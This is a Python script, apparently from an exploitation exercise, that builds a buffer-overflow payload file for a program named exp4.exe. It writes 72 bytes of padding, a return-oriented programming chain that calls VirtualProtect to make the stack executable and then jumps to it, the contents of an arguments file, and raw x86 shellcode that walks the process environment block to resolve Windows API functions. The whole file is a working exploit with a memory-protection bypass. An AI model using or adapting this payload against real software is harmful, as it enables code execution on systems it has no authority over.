import struct

seq = 'A'*72

with open('final.txt', 'w') as f:
    for i in seq:
        f.write(i)

rop_gadgets = [
    # [---INFO:gadgets_to_set_esi:---]

    0x00dd4499,  # POP ECX # RETN [exp4.exe]
    0x00000000,
    0x00000000,
    0x00f00688,  # ptr to &VirtualProtect() [IAT exp4.exe]

    0x00dc7799,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe]
    0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe]
    # [---INFO:gadgets_to_set_ebp:---]
    0x00806159,  # POP EBP # RETN [exp4.exe]
    0x0089a861,  # & jmp esp [exp4.exe]
    # [---INFO:gadgets_to_set_ebx:---]
    0x00b29006,  # POP EBX # RETN [exp4.exe]
    0x00000201,  # 0x00000201-> ebx
    # [---INFO:gadgets_to_set_edx:---]
    0x00b13264,  # POP EDX # RETN [exp4.exe]
    0x00000040,  # 0x00000040-> edx
    # [---INFO:gadgets_to_set_ecx:---]
    0x00e13f27,  # POP ECX # RETN [exp4.exe]
    0x00efc8a9,  # &Writable location [exp4.exe]
    # [---INFO:gadgets_to_set_edi:---]
    0x0089ca01,  # POP EDI # RETN [exp4.exe]
    0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
    # [---INFO:gadgets_to_set_eax:---]
    0x00c357f5,  # POP EAX # RETN [exp4.exe]
    0x90909090,  # nop
    # [---INFO:pushad:---]
    0x00b250d2,  # PUSHAD # RETN [exp4.exe]
]

jmp_code = [
    0x000000E8,
    0xC7835F00,
    0x00E7FF5B,
]

shellcode = [
    0x000000E8,
    0xEF835F00,
    0xB07F8905,
    0x0030A164,
    0x408B0000,
    0x1C408B0C,
    0x408B008B,
    0xF8478908,
    0x8BF88B57,
    0x548B3C47,
    0xD7037807,
    0x8B144A8B,
    0xDF03205A,
    0x8B348B49,
    0x47B8F703,
    0x39507465,
    0xB8F17506,
    0x41636F72,
    0x75044639,
    0x245A8BE7,
    0x8B66DF03,
    0x5A8B4B0C,
    0x8BDF031C,
    0xC7038B04,
    0xFC47895F,
    0xEB83DF8B,
    0xC383531C,
    0xF873FF1C,
    0x89FC53FF,
    0x106AF443,
    0xEB83006A,
    0xC383534C,
    0xF453FF4C,
    0x8BAC4389,
    0x3CEB83D0,
    0x3CC38353,
    0xFC53FF52,
    0x532CEB83,
    0xFF2CC383,
    0xD0,
]

with open('final.txt', 'ab+') as f:
    for i in rop_gadgets+jmp_code:
        f.write(struct.pack('<I', i))
    with open("arguments.txt", "rb") as f1:
        f.write(f1.read())
    for i in shellcode:
        f.write(struct.pack('<I', i))
